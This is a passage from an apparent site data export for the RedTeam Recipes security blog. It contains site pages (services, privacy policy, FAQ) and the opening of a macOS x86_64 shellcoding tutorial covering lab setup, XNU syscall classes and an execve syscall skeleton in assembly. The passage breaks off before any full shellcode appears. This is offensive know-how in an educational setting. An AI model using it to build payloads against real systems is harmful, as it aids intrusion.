RedTeam Recipes posts. Keep shipping research and we‚Äôll add you to the board.</p>\n</blockquote>\n<!-- Celebrate the people pushing the craft forward. Update this table as you add real contributors.\n\n| Alias            | Specialty              | Signature Recipe                | Notes                          |\n| ---------------- | ---------------------- | -------------------------------- | ------------------------------ |\n| GhostBaker       | EDR bypass & tradecraft| Stealthy Mise en Place          | Always ships working PoCs      |\n| PacketSousChef   | Network telemetry      | Slow-Cooked Beacon Reduction     | Loves packet captures          |\n| TTPForger        | Payload development    | Smokehouse DLL Chains            | Adds mitigation advice         |\n| BlueFriend       | Detection engineering  | Purple-Team Reduction Sauce      | Provides blue-team POV         |\n\n> Swap in the real names, links, or photos when you have them. -->\n"},{"title":"Trusted Partners","tags":[],"categories":[],"comments":0,"date":"2024-06-01T08:10:00.000Z","layout":"page","_content":"\n# Coming Soon\n\n<!-- Showcase your collaborators here once the real relationships are ready.\n\n<div class=\"columns is-multiline\">\n  <div class=\"column is-one-third\">\n    <a href=\"https://example.com/partner1\" target=\"_blank\" rel=\"noopener\">\n      <img src=\"/images/site/partners/partner-one.svg\" alt=\"Partner One logo\" width=\"300\" height=\"120\" loading=\"lazy\">\n      <p class=\"mt-2\">Partner One ‚Äì Cloud lab infrastructure.</p>\n    </a>\n  </div>\n  <div class=\"column is-one-third\">\n    <a href=\"https://example.com/partner2\" target=\"_blank\" rel=\"noopener\">\n      <img src=\"/images/site/partners/partner-two.svg\" alt=\"Partner Two logo\" width=\"300\" height=\"120\" loading=\"lazy\">\n      <p class=\"mt-2\">Partner Two ‚Äì Detection engineering advisors.</p>\n    </a>\n  </div>\n  <div class=\"column is-one-third\">\n    <a href=\"https://example.com/partner3\" target=\"_blank\" rel=\"noopener\">\n      <img src=\"/images/site/partners/partner-three.svg\" alt=\"Partner Three logo\" width=\"300\" height=\"120\" loading=\"lazy\">\n      <p class=\"mt-2\">Partner Three ‚Äì Purple team lab builders.</p>\n    </a>\n  </div>\n</div>\n\n> Replace the placeholder logos and blurbs once you sign real partnerships. -->\n","source":"partners/index.md","raw":"---\ntitle: Trusted Partners\ntags: []\ncategories: []\ncomments: false\ndate: 2024-06-01 11:10:00\nlayout: page\n---\n\n# Coming Soon\n\n<!-- Showcase your collaborators here once the real relationships are ready.\n\n<div class=\"columns is-multiline\">\n  <div class=\"column is-one-third\">\n    <a href=\"https://example.com/partner1\" target=\"_blank\" rel=\"noopener\">\n      <img src=\"/images/site/partners/partner-one.svg\" alt=\"Partner One logo\" width=\"300\" height=\"120\" loading=\"lazy\">\n      <p class=\"mt-2\">Partner One ‚Äì Cloud lab infrastructure.</p>\n    </a>\n  </div>\n  <div class=\"column is-one-third\">\n    <a href=\"https://example.com/partner2\" target=\"_blank\" rel=\"noopener\">\n      <img src=\"/images/site/partners/partner-two.svg\" alt=\"Partner Two logo\" width=\"300\" height=\"120\" loading=\"lazy\">\n      <p class=\"mt-2\">Partner Two ‚Äì Detection engineering advisors.</p>\n    </a>\n  </div>\n  <div class=\"column is-one-third\">\n    <a href=\"https://example.com/partner3\" target=\"_blank\" rel=\"noopener\">\n      <img src=\"/images/site/partners/partner-three.svg\" alt=\"Partner Three logo\" width=\"300\" height=\"120\" loading=\"lazy\">\n      <p class=\"mt-2\">Partner Three ‚Äì Purple team lab builders.</p>\n    </a>\n  </div>\n</div>\n\n> Replace the placeholder logos and blurbs once you sign real partnerships. -->\n","updated":"2025-11-28T15:12:06.027Z","path":"partners/index.html","_id":"cmij2yuoa00059reu9a8rdsu5","content":"<h1 id=\"Coming-Soon\"><a href=\"#Coming-Soon\" class=\"headerlink\" title=\"Coming Soon\"></a>Coming Soon</h1><!-- Showcase your collaborators here once the real relationships are ready.\n\n<div class=\"columns is-multiline\">\n  <div class=\"column is-one-third\">\n    <a href=\"https://example.com/partner1\" target=\"_blank\" rel=\"noopener\">\n      <img src=\"/images/site/partners/partner-one.svg\" alt=\"Partner One logo\" width=\"300\" height=\"120\" loading=\"lazy\">\n      <p class=\"mt-2\">Partner One ‚Äì Cloud lab infrastructure.</p>\n    </a>\n  </div>\n  <div class=\"column is-one-third\">\n    <a href=\"https://example.com/partner2\" target=\"_blank\" rel=\"noopener\">\n      <img src=\"/images/site/partners/partner-two.svg\" alt=\"Partner Two logo\" width=\"300\" height=\"120\" loading=\"lazy\">\n      <p class=\"mt-2\">Partner Two ‚Äì Detection engineering advisors.</p>\n    </a>\n  </div>\n  <div class=\"column is-one-third\">\n    <a href=\"https://example.com/partner3\" target=\"_blank\" rel=\"noopener\">\n      <img src=\"/images/site/partners/partner-three.svg\" alt=\"Partner Three logo\" width=\"300\" height=\"120\" loading=\"lazy\">\n      <p class=\"mt-2\">Partner Three ‚Äì Purple team lab builders.</p>\n    </a>\n  </div>\n</div>\n\n> Replace the placeholder logos and blurbs once you sign real partnerships. -->\n","excerpt":"","more":"<h1 id=\"Coming-Soon\"><a href=\"#Coming-Soon\" class=\"headerlink\" title=\"Coming Soon\"></a>Coming Soon</h1><!-- Showcase your collaborators here once the real relationships are ready.\n\n<div class=\"columns is-multiline\">\n  <div class=\"column is-one-third\">\n    <a href=\"https://example.com/partner1\" target=\"_blank\" rel=\"noopener\">\n      <img src=\"/images/site/partners/partner-one.svg\" alt=\"Partner One logo\" width=\"300\" height=\"120\" loading=\"lazy\">\n      <p class=\"mt-2\">Partner One ‚Äì Cloud lab infrastructure.</p>\n    </a>\n  </div>\n  <div class=\"column is-one-third\">\n    <a href=\"https://example.com/partner2\" target=\"_blank\" rel=\"noopener\">\n      <img src=\"/images/site/partners/partner-two.svg\" alt=\"Partner Two logo\" width=\"300\" height=\"120\" loading=\"lazy\">\n      <p class=\"mt-2\">Partner Two ‚Äì Detection engineering advisors.</p>\n    </a>\n  </div>\n  <div class=\"column is-one-third\">\n    <a href=\"https://example.com/partner3\" target=\"_blank\" rel=\"noopener\">\n      <img src=\"/images/site/partners/partner-three.svg\" alt=\"Partner Three logo\" width=\"300\" height=\"120\" loading=\"lazy\">\n      <p class=\"mt-2\">Partner Three ‚Äì Purple team lab builders.</p>\n    </a>\n  </div>\n</div>\n\n> Replace the placeholder logos and blurbs once you sign real partnerships. -->\n"},{"title":"Privacy Policy","tags":[],"categories":[],"comments":0,"date":"2024-06-01T05:30:00.000Z","layout":"page","_content":"\nThis site (https://www.redteamrecipes.com) is operated by the RedTeam Recipes collective. We keep the footprint small: no ad tech, no third‚Äëparty analytics, and only the minimum data required to run static pages and reply to emails.\n\n## Web Logs\nWhen you browse the site we log the usual web server telemetry-IP address, user agent, referrer, and the path requested. Logs rotate within 30 days and are used strictly for performance, abuse troubleshooting, or mandatory legal requests.\n\n## Email and Submissions\nIf you email `contact@redteamrecipes.com` or `sponsorship@redteamrecipes.com`, the message and your address are stored in our inbox provider so we can reply. We never sell or share submissions; access is limited to the core RTR coordinators. If you request deletion, we remove the thread unless retention is required by law or an active engagement.\n\n## Community Channels\nWe maintain community spaces on Reddit, Telegram, and X. These platforms have their own privacy policies and may collect additional data beyond our control. Only share what you are comfortable posting on those services.\n\n## Cookies and Tracking\nWe does not set cookies by default and we do not inject any trackers, pixels, or fingerprinting scripts. If we embed external media in the future (video players, code sandboxes, etc.) we will update this page with the relevant disclosures.\n\n## Data Requests\nTo request log deletion, remove an email thread, or ask any privacy-related question, contact [contact@redteamrecipes.com](mailto:contact@redteamrecipes.com). Please include enough context (approximate timestamp, channel used) so we can locate the data.\n\nThis policy will evolve as we add new features. Significant changes will be summarized on the home page and dated revisions will be noted here.\n","source":"privacy-policy/index.md","raw":"---\ntitle: Privacy Policy\ntags: []\ncategories: []\ncomments: false\ndate: 2024-06-01 08:30:00\nlayout: page\n---\n\nThis site (https://www.redteamrecipes.com) is operated by the RedTeam Recipes collective. We keep the footprint small: no ad tech, no third‚Äëparty analytics, and only the minimum data required to run static pages and reply to emails.\n\n## Web Logs\nWhen you browse the site we log the usual web server telemetry-IP address, user agent, referrer, and the path requested. Logs rotate within 30 days and are used strictly for performance, abuse troubleshooting, or mandatory legal requests.\n\n## Email and Submissions\nIf you email `contact@redteamrecipes.com` or `sponsorship@redteamrecipes.com`, the message and your address are stored in our inbox provider so we can reply. We never sell or share submissions; access is limited to the core RTR coordinators. If you request deletion, we remove the thread unless retention is required by law or an active engagement.\n\n## Community Channels\nWe maintain community spaces on Reddit, Telegram, and X. These platforms have their own privacy policies and may collect additional data beyond our control. Only share what you are comfortable posting on those services.\n\n## Cookies and Tracking\nWe does not set cookies by default and we do not inject any trackers, pixels, or fingerprinting scripts. If we embed external media in the future (video players, code sandboxes, etc.) we will update this page with the relevant disclosures.\n\n## Data Requests\nTo request log deletion, remove an email thread, or ask any privacy-related question, contact [contact@redteamrecipes.com](mailto:contact@redteamrecipes.com). Please include enough context (approximate timestamp, channel used) so we can locate the data.\n\nThis policy will evolve as we add new features. Significant changes will be summarized on the home page and dated revisions will be noted here.\n","updated":"2025-11-28T15:10:16.339Z","path":"privacy-policy/index.html","_id":"cmij2yuoa00069reubp2w28v4","content":"<p>This site (<a href=\"https://www.redteamrecipes.com/\">https://www.redteamrecipes.com</a>) is operated by the RedTeam Recipes collective. We keep the footprint small: no ad tech, no third‚Äëparty analytics, and only the minimum data required to run static pages and reply to emails.</p>\n<h2 id=\"Web-Logs\"><a href=\"#Web-Logs\" class=\"headerlink\" title=\"Web Logs\"></a>Web Logs</h2><p>When you browse the site we log the usual web server telemetry-IP address, user agent, referrer, and the path requested. Logs rotate within 30 days and are used strictly for performance, abuse troubleshooting, or mandatory legal requests.</p>\n<h2 id=\"Email-and-Submissions\"><a href=\"#Email-and-Submissions\" class=\"headerlink\" title=\"Email and Submissions\"></a>Email and Submissions</h2><p>If you email <code>contact@redteamrecipes.com</code> or <code>sponsorship@redteamrecipes.com</code>, the message and your address are stored in our inbox provider so we can reply. We never sell or share submissions; access is limited to the core RTR coordinators. If you request deletion, we remove the thread unless retention is required by law or an active engagement.</p>\n<h2 id=\"Community-Channels\"><a href=\"#Community-Channels\" class=\"headerlink\" title=\"Community Channels\"></a>Community Channels</h2><p>We maintain community spaces on Reddit, Telegram, and X. These platforms have their own privacy policies and may collect additional data beyond our control. Only share what you are comfortable posting on those services.</p>\n<h2 id=\"Cookies-and-Tracking\"><a href=\"#Cookies-and-Tracking\" class=\"headerlink\" title=\"Cookies and Tracking\"></a>Cookies and Tracking</h2><p>We does not set cookies by default and we do not inject any trackers, pixels, or fingerprinting scripts. If we embed external media in the future (video players, code sandboxes, etc.) we will update this page with the relevant disclosures.</p>\n<h2 id=\"Data-Requests\"><a href=\"#Data-Requests\" class=\"headerlink\" title=\"Data Requests\"></a>Data Requests</h2><p>To request log deletion, remove an email thread, or ask any privacy-related question, contact <a href=\"mailto:&#x63;&#x6f;&#110;&#116;&#97;&#x63;&#x74;&#64;&#114;&#101;&#x64;&#x74;&#x65;&#x61;&#x6d;&#x72;&#x65;&#99;&#x69;&#x70;&#101;&#x73;&#x2e;&#x63;&#x6f;&#109;\">contact@redteamrecipes.com</a>. Please include enough context (approximate timestamp, channel used) so we can locate the data.</p>\n<p>This policy will evolve as we add new features. Significant changes will be summarized on the home page and dated revisions will be noted here.</p>\n","excerpt":"","more":"<p>This site (<a href=\"https://www.redteamrecipes.com/\">https://www.redteamrecipes.com</a>) is operated by the RedTeam Recipes collective. We keep the footprint small: no ad tech, no third‚Äëparty analytics, and only the minimum data required to run static pages and reply to emails.</p>\n<h2 id=\"Web-Logs\"><a href=\"#Web-Logs\" class=\"headerlink\" title=\"Web Logs\"></a>Web Logs</h2><p>When you browse the site we log the usual web server telemetry-IP address, user agent, referrer, and the path requested. Logs rotate within 30 days and are used strictly for performance, abuse troubleshooting, or mandatory legal requests.</p>\n<h2 id=\"Email-and-Submissions\"><a href=\"#Email-and-Submissions\" class=\"headerlink\" title=\"Email and Submissions\"></a>Email and Submissions</h2><p>If you email <code>contact@redteamrecipes.com</code> or <code>sponsorship@redteamrecipes.com</code>, the message and your address are stored in our inbox provider so we can reply. We never sell or share submissions; access is limited to the core RTR coordinators. If you request deletion, we remove the thread unless retention is required by law or an active engagement.</p>\n<h2 id=\"Community-Channels\"><a href=\"#Community-Channels\" class=\"headerlink\" title=\"Community Channels\"></a>Community Channels</h2><p>We maintain community spaces on Reddit, Telegram, and X. These platforms have their own privacy policies and may collect additional data beyond our control. Only share what you are comfortable posting on those services.</p>\n<h2 id=\"Cookies-and-Tracking\"><a href=\"#Cookies-and-Tracking\" class=\"headerlink\" title=\"Cookies and Tracking\"></a>Cookies and Tracking</h2><p>We does not set cookies by default and we do not inject any trackers, pixels, or fingerprinting scripts. If we embed external media in the future (video players, code sandboxes, etc.) we will update this page with the relevant disclosures.</p>\n<h2 id=\"Data-Requests\"><a href=\"#Data-Requests\" class=\"headerlink\" title=\"Data Requests\"></a>Data Requests</h2><p>To request log deletion, remove an email thread, or ask any privacy-related question, contact <a href=\"mailto:&#x63;&#x6f;&#110;&#116;&#97;&#x63;&#x74;&#64;&#114;&#101;&#x64;&#x74;&#x65;&#x61;&#x6d;&#x72;&#x65;&#99;&#x69;&#x70;&#101;&#x73;&#x2e;&#x63;&#x6f;&#109;\">contact@redteamrecipes.com</a>. Please include enough context (approximate timestamp, channel used) so we can locate the data.</p>\n<p>This policy will evolve as we add new features. Significant changes will be summarized on the home page and dated revisions will be noted here.</p>\n"},{"title":"Questions","tags":[],"categories":[],"comments":0,"date":"2024-06-01T08:05:00.000Z","layout":"page","_content":"\n# Comming Soon\n\n<!-- Use this FAQ hub to address common questions‚Äîsubmission guidelines, how to request a write-up, or what tooling is allowed in public posts.\n\n### How do I submit a recipe?\nSend an email to `contact@example.com` with the objective, tooling, and detection notes. We reply within 3 business days.\n\n### Can I stay anonymous?\nYes. Share the details privately and we‚Äôll work out attribution levels that match your policies.\n\n### What labs do you accept?\nAnything you can legally run: cloud ranges, on-prem replicas, or hybrid environments. Just include repro steps.\n\n### Are there publishing rules?\nNothing weaponized. Stick to research-grade content with clear detection countermeasures. -->\n","source":"questions/index.md","raw":"---\ntitle: Questions\ntags: []\ncategories: []\ncomments: false\ndate: 2024-06-01 11:05:00\nlayout: page\n---\n\n# Comming Soon\n\n<!-- Use this FAQ hub to address common questions‚Äîsubmission guidelines, how to request a write-up, or what tooling is allowed in public posts.\n\n### How do I submit a recipe?\nSend an email to `contact@example.com` with the objective, tooling, and detection notes. We reply within 3 business days.\n\n### Can I stay anonymous?\nYes. Share the details privately and we‚Äôll work out attribution levels that match your policies.\n\n### What labs do you accept?\nAnything you can legally run: cloud ranges, on-prem replicas, or hybrid environments. Just include repro steps.\n\n### Are there publishing rules?\nNothing weaponized. Stick to research-grade content with clear detection countermeasures. -->\n","updated":"2025-11-28T15:13:19.013Z","path":"questions/index.html","_id":"cmij2yuob00079reu96kca877","content":"<h1 id=\"Comming-Soon\"><a href=\"#Comming-Soon\" class=\"headerlink\" title=\"Comming Soon\"></a>Comming Soon</h1><!-- Use this FAQ hub to address common questions‚Äîsubmission guidelines, how to request a write-up, or what tooling is allowed in public posts.\n\n### How do I submit a recipe?\nSend an email to `contact@example.com` with the objective, tooling, and detection notes. We reply within 3 business days.\n\n### Can I stay anonymous?\nYes. Share the details privately and we‚Äôll work out attribution levels that match your policies.\n\n### What labs do you accept?\nAnything you can legally run: cloud ranges, on-prem replicas, or hybrid environments. Just include repro steps.\n\n### Are there publishing rules?\nNothing weaponized. Stick to research-grade content with clear detection countermeasures. -->\n","excerpt":"","more":"<h1 id=\"Comming-Soon\"><a href=\"#Comming-Soon\" class=\"headerlink\" title=\"Comming Soon\"></a>Comming Soon</h1><!-- Use this FAQ hub to address common questions‚Äîsubmission guidelines, how to request a write-up, or what tooling is allowed in public posts.\n\n### How do I submit a recipe?\nSend an email to `contact@example.com` with the objective, tooling, and detection notes. We reply within 3 business days.\n\n### Can I stay anonymous?\nYes. Share the details privately and we‚Äôll work out attribution levels that match your policies.\n\n### What labs do you accept?\nAnything you can legally run: cloud ranges, on-prem replicas, or hybrid environments. Just include repro steps.\n\n### Are there publishing rules?\nNothing weaponized. Stick to research-grade content with clear detection countermeasures. -->\n"},{"title":"Services","tags":[],"categories":[],"comments":0,"date":"2024-06-01T07:00:00.000Z","layout":"page","_content":"\nWe deliver offensive security services that match the same depth you see in every RedTeam Recipes post. Every engagement is run by practitioners who publish their research here, ensuring the work stays practical, transparent, and battle-tested.\n\n## Penetration Testing\n- **Web Applications** ‚Äì Manual exploit development, business-logic abuse, and chained findings that mimic real adversaries.\n- **Mobile Applications** ‚Äì Reverse-engineering and dynamic analysis for iOS and Android, including API abuse and supply-chain checks.\n- **Network & Infrastructure** ‚Äì Internal and external campaigns covering AD misconfigurations, cloud footholds, and lateral movement paths.\n- **Red Team Assessments** ‚Äì Goal-oriented operations with stealth tooling, custom malware, and purple-team knowledge transfer.\n\nEach report includes replayable PoC steps, mitigation guidance, and executive summaries tailored to stakeholders.\n\n## CTF & Event Creation\nNeed to challenge your team or community? We design full-spectrum CTFs and live-fire ranges:\n\n- Scenario design aligned with your industry or threat model.\n- Custom infrastructure with automated scoring, hints, and monitoring dashboards.\n- Facilitator guides, solution write-ups, and optional on-site or remote support.\n\n## How to Engage\n1. Send a short brief to [sponsorship@redteamrecipes.com](mailto:sponsorship@redteamrecipes.com) with your objectives, target scope, and desired timeline.\n2. We schedule a scoping call with the operators who will run the project‚Äîno sales hand-offs.\n3. You receive a phased proposal outlining deliverables, pricing, and knowledge-transfer milestones.\n\nHave questions or need a custom engagement? Reach out via the [contact page](/contact/) or email us directly. We keep response times within two business days.\n","source":"services/index.md","raw":"---\ntitle: Services\ntags: []\ncategories: []\ncomments: false\ndate: 2024-06-01 10:00:00\nlayout: page\n---\n\nWe deliver offensive security services that match the same depth you see in every RedTeam Recipes post. Every engagement is run by practitioners who publish their research here, ensuring the work stays practical, transparent, and battle-tested.\n\n## Penetration Testing\n- **Web Applications** ‚Äì Manual exploit development, business-logic abuse, and chained findings that mimic real adversaries.\n- **Mobile Applications** ‚Äì Reverse-engineering and dynamic analysis for iOS and Android, including API abuse and supply-chain checks.\n- **Network & Infrastructure** ‚Äì Internal and external campaigns covering AD misconfigurations, cloud footholds, and lateral movement paths.\n- **Red Team Assessments** ‚Äì Goal-oriented operations with stealth tooling, custom malware, and purple-team knowledge transfer.\n\nEach report includes replayable PoC steps, mitigation guidance, and executive summaries tailored to stakeholders.\n\n## CTF & Event Creation\nNeed to challenge your team or community? We design full-spectrum CTFs and live-fire ranges:\n\n- Scenario design aligned with your industry or threat model.\n- Custom infrastructure with automated scoring, hints, and monitoring dashboards.\n- Facilitator guides, solution write-ups, and optional on-site or remote support.\n\n## How to Engage\n1. Send a short brief to [sponsorship@redteamrecipes.com](mailto:sponsorship@redteamrecipes.com) with your objectives, target scope, and desired timeline.\n2. We schedule a scoping call with the operators who will run the project‚Äîno sales hand-offs.\n3. You receive a phased proposal outlining deliverables, pricing, and knowledge-transfer milestones.\n\nHave questions or need a custom engagement? Reach out via the [contact page](/contact/) or email us directly. We keep response times within two business days.\n","updated":"2025-11-28T16:15:33.233Z","path":"services/index.html","_id":"cmij2yuoc00089reu1ssx8hle","content":"<p>We deliver offensive security services that match the same depth you see in every RedTeam Recipes post. Every engagement is run by practitioners who publish their research here, ensuring the work stays practical, transparent, and battle-tested.</p>\n<h2 id=\"Penetration-Testing\"><a href=\"#Penetration-Testing\" class=\"headerlink\" title=\"Penetration Testing\"></a>Penetration Testing</h2><ul>\n<li><strong>Web Applications</strong> ‚Äì Manual exploit development, business-logic abuse, and chained findings that mimic real adversaries.</li>\n<li><strong>Mobile Applications</strong> ‚Äì Reverse-engineering and dynamic analysis for iOS and Android, including API abuse and supply-chain checks.</li>\n<li><strong>Network &amp; Infrastructure</strong> ‚Äì Internal and external campaigns covering AD misconfigurations, cloud footholds, and lateral movement paths.</li>\n<li><strong>Red Team Assessments</strong> ‚Äì Goal-oriented operations with stealth tooling, custom malware, and purple-team knowledge transfer.</li>\n</ul>\n<p>Each report includes replayable PoC steps, mitigation guidance, and executive summaries tailored to stakeholders.</p>\n<h2 id=\"CTF-Event-Creation\"><a href=\"#CTF-Event-Creation\" class=\"headerlink\" title=\"CTF &amp; Event Creation\"></a>CTF &amp; Event Creation</h2><p>Need to challenge your team or community? We design full-spectrum CTFs and live-fire ranges:</p>\n<ul>\n<li>Scenario design aligned with your industry or threat model.</li>\n<li>Custom infrastructure with automated scoring, hints, and monitoring dashboards.</li>\n<li>Facilitator guides, solution write-ups, and optional on-site or remote support.</li>\n</ul>\n<h2 id=\"How-to-Engage\"><a href=\"#How-to-Engage\" class=\"headerlink\" title=\"How to Engage\"></a>How to Engage</h2><ol>\n<li>Send a short brief to <a href=\"mailto:&#115;&#112;&#x6f;&#x6e;&#x73;&#x6f;&#114;&#115;&#x68;&#x69;&#x70;&#64;&#114;&#101;&#100;&#116;&#101;&#97;&#109;&#114;&#101;&#99;&#x69;&#x70;&#x65;&#115;&#46;&#x63;&#111;&#109;\">sponsorship@redteamrecipes.com</a> with your objectives, target scope, and desired timeline.</li>\n<li>We schedule a scoping call with the operators who will run the project‚Äîno sales hand-offs.</li>\n<li>You receive a phased proposal outlining deliverables, pricing, and knowledge-transfer milestones.</li>\n</ol>\n<p>Have questions or need a custom engagement? Reach out via the <a href=\"/contact/\">contact page</a> or email us directly. We keep response times within two business days.</p>\n","excerpt":"","more":"<p>We deliver offensive security services that match the same depth you see in every RedTeam Recipes post. Every engagement is run by practitioners who publish their research here, ensuring the work stays practical, transparent, and battle-tested.</p>\n<h2 id=\"Penetration-Testing\"><a href=\"#Penetration-Testing\" class=\"headerlink\" title=\"Penetration Testing\"></a>Penetration Testing</h2><ul>\n<li><strong>Web Applications</strong> ‚Äì Manual exploit development, business-logic abuse, and chained findings that mimic real adversaries.</li>\n<li><strong>Mobile Applications</strong> ‚Äì Reverse-engineering and dynamic analysis for iOS and Android, including API abuse and supply-chain checks.</li>\n<li><strong>Network &amp; Infrastructure</strong> ‚Äì Internal and external campaigns covering AD misconfigurations, cloud footholds, and lateral movement paths.</li>\n<li><strong>Red Team Assessments</strong> ‚Äì Goal-oriented operations with stealth tooling, custom malware, and purple-team knowledge transfer.</li>\n</ul>\n<p>Each report includes replayable PoC steps, mitigation guidance, and executive summaries tailored to stakeholders.</p>\n<h2 id=\"CTF-Event-Creation\"><a href=\"#CTF-Event-Creation\" class=\"headerlink\" title=\"CTF &amp; Event Creation\"></a>CTF &amp; Event Creation</h2><p>Need to challenge your team or community? We design full-spectrum CTFs and live-fire ranges:</p>\n<ul>\n<li>Scenario design aligned with your industry or threat model.</li>\n<li>Custom infrastructure with automated scoring, hints, and monitoring dashboards.</li>\n<li>Facilitator guides, solution write-ups, and optional on-site or remote support.</li>\n</ul>\n<h2 id=\"How-to-Engage\"><a href=\"#How-to-Engage\" class=\"headerlink\" title=\"How to Engage\"></a>How to Engage</h2><ol>\n<li>Send a short brief to <a href=\"mailto:&#115;&#112;&#x6f;&#x6e;&#x73;&#x6f;&#114;&#115;&#x68;&#x69;&#x70;&#64;&#114;&#101;&#100;&#116;&#101;&#97;&#109;&#114;&#101;&#99;&#x69;&#x70;&#x65;&#115;&#46;&#x63;&#111;&#109;\">sponsorship@redteamrecipes.com</a> with your objectives, target scope, and desired timeline.</li>\n<li>We schedule a scoping call with the operators who will run the project‚Äîno sales hand-offs.</li>\n<li>You receive a phased proposal outlining deliverables, pricing, and knowledge-transfer milestones.</li>\n</ol>\n<p>Have questions or need a custom engagement? Reach out via the <a href=\"/contact/\">contact page</a> or email us directly. We keep response times within two business days.</p>\n"},{"layout":"widget/widget-recent.pug","_content":"","source":"widget/index.md","raw":"---\nlayout: widget/widget-recent.pug\n---\n","date":"2025-11-28T06:58:25.857Z","updated":"2025-11-28T06:58:25.857Z","path":"widget/index.html","title":"","comments":1,"_id":"cmij2yuoc00099reu51akb7om","content":"","excerpt":"","more":""}],"Post":[{"title":"macOS Shellcoding in depth on x86_6","author":"Zeyad Azima","date":"2025-11-23T22:00:00.000Z","toc":true,"description":"macOS Shellcoding in depth on x86_64.","cover":"/images/site/posts/macos/image.psd.png","_content":"\n# Introduction\n\nThis guide explores shellcoding on the `x86_64` architecture for `macOS`, bypassing the traditional x86 starting point for a practical reason: with the release of macOS 10.15 (`Catalina`), Apple discontinued support for `32-bit` applications entirely. Since `x86_64` maintains backward compatibility with x86 code anyway, focusing on `64-bit` shellcoding makes the most sense for modern `macOS` systems. Before diving in, you'll need at least a basic understanding of assembly language‚Äîthis isn't an assembly tutorial, so if you're unfamiliar with the fundamentals, take some time to learn them first and return when you're ready for the challenge. Rather than immediately jumping into cryptic assembly instructions, this guide follows a practical workflow: start by writing code in `C`, identify the necessary system calls, and then translate everything into assembly. This approach leverages the wealth of existing `C` documentation and resources, making the process significantly more manageable. You'll find countless examples of how to build network clients, manipulate processes, or execute commands in `C`, but you'd be hard-pressed to find someone talking about implementing these same tasks purely in assembly. Let's start with our Blogpost.\n\n> You can find all the code on my github: [https://github.com/Zeyad-Azima/macOShellcoding](https://github.com/Zeyad-Azima/macOShellcoding)\n\n# Lab Setup\n\nLet's Setup our Lab and the required tools, Let's list all the other tools we need. \n\n- Homebrew\n\n```sh\n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"\n```\n\n- Xcode: \n\n```\nWe can download it from `AppStore`.\nor: https://xcodereleases.com\n```\n\n- Xcode Command Line Tools (CLT)\n\n```sh\nxcode-select --install\n```\n\n- Nasm\n\n```sh\nbrew install nasm\n```\n\n- Binutils (`ld`)\n\n```sh\nbrew install binutils\n```\n\nBefore we go on straight to shellcoding, We need to understand some FUNDAMENTALS first we would be using to be able to write shellcodes. As we know the macos kernel (`XNU`) is a hybrid kernel which contains also `BSD`. We need to download the `XNU` source code. Cause we will use it for references in creating ours shellcodes and understanding `syscalls` on `macOS`. We can download it from [here](https://opensource.apple.com/releases/).\n\nNow, We need to download the source code version that matches the macOS you writing the shellcode for. I am on `macOS Sequoia` and the version is `macOS 15.5`. You can use `sw_vers` command to check it.\n\n```sh\n~ % sw_vers\nProductName:\t\tmacOS\nProductVersion:\t\t15.5\nBuildVersion:\t\t24F74\n```\n\nNow, Let's download the `XNU` VERSION FOR it.\n\n![macOS XNU release page](/images/site/posts/macos/xnu-release-page.png)\n\nWhen we scroll down more we can find it.\n\n\n\n![XNU version block](/images/site/posts/macos/xnu-version-block.png)\n\nThat's the version (`xnu-11417.121.6`) of `macOS 15.5`.\n\n# XNU Syscall Classes\nNow, Let's open it with `VSCode` or your favorite `IDE/CodeEditor`.\n\n![XNU source tree in VS Code](/images/site/posts/macos/xnu-tree.png)\n\nAll these files and folders for kernel we will use just some of it to understand the basics, But while we writing our shellcodes we would be navigating a lot through different files and folders. First Let's go to `osfmk/mach/i386/syscall_sw.h`.\n\n![syscall header snippet](/images/site/posts/macos/syscall-header.png)\n\nstarting on line `135` till `152`, That's what matters of us. In here as we know and mentioned before that `XNU` is hybrid, So if you want to make execute a syscall for related to `BSD` you would need to define the entry to it.\n\n```C\n#define SYSCALL_CLASS_SHIFT\t24\n#define SYSCALL_CLASS_MASK\t(0xFF << SYSCALL_CLASS_SHIFT)\n#define SYSCALL_NUMBER_MASK\t(~SYSCALL_CLASS_MASK)\n......\n#define SYSCALL_CLASS_NONE\t0\t/* Invalid */\n#define SYSCALL_CLASS_MACH\t1\t/* Mach */\t\n#define SYSCALL_CLASS_UNIX\t2\t/* Unix/BSD */\n#define SYSCALL_CLASS_MDEP\t3\t/* Machine-dependent */\n#define SYSCALL_CLASS_DIAG\t4\t/* Diagnostics */\n#define SYSCALL_CLASS_IPC\t5\t/* Mach IPC */\n```\n\nIn `XNU` (the kernel underlying `macOS`, `iOS`, etc.), system calls are not uniformly accessed via a single syscall table like in `Linux`. Instead, `XNU` uses syscall classes to route calls through different subsystems. Each system call class is associated with a unique number, which is shifted left by 24 bits (defined by `SYSCALL_CLASS_SHIFT`) to determine its class. So for every class to get the entry it will be as the following:\n\n| Class | Name                  | Value | Shifted Base (`<< 24`) |               |\n|-------|-----------------------|-------|------------------------|----------------------|\n| 0     | `SYSCALL_CLASS_NONE`  | 0     | `0x00000000`           | Invalid              |\n| 1     | `SYSCALL_CLASS_MACH`  | 1     | `0x01000000`           | Mach traps           |\n| 2     | `SYSCALL_CLASS_UNIX`  | 2     | `0x02000000`           | **BSD syscalls**     |\n| 3     | `SYSCALL_CLASS_MDEP`  | 3     | `0x03000000`           | Machine-dependent    |\n| 4     | `SYSCALL_CLASS_DIAG`  | 4     | `0x04000000`           | Diagnostics          |\n| 5     | `SYSCALL_CLASS_IPC`   | 5     | `0x05000000`           | Mach IPC (newer)     |\n\n> BSD = 0x02 << 24 = 0x02000000 ‚Üí 0x2000000\n\nThe `SYSCALL_CLASS_MASK` and `SYSCALL_NUMBER_MASK` are used to extract the class and syscall number respectively. For example, a traditional `BSD` system call such as `execve` (system call number `59` or `0x3b` in hex) in the `SYSCALL_CLASS_UNIX` (number `2`) would be represented as `0x200003b` when passed to the syscall assembly instruction.\n\n```asm\n\n; Assembly example to make a syscall with execve (BSD) in macOS\nmov rax, 0x200003b  ; Load the syscall number for execve (59 with class mask)\nmov rdi, address    ; Address of the command to execute\nmov rsi, argv       ; Pointer to an array of arguments\nmov rdx, envp       ; Pointer to an array of environment variables\nsyscall             ; Make the system call\n```\n\nTo make it clear, You're dining in the `XNU` restaurant, a multi-level establishment where each floor represents a different system call class, and the kitchen routes your order based on a cleverly encoded ticket. The first floor, `SYSCALL_CLASS_MACH` (class 1), serves hearty main courses like task and thread operations, while the second floor, `SYSCALL_CLASS_UNIX` (class 2), specializes in classic `BSD` desserts such as `execve` and `write`. To order a medium-rare steak ‚Äî item number `0x3B` (59) on the Mach 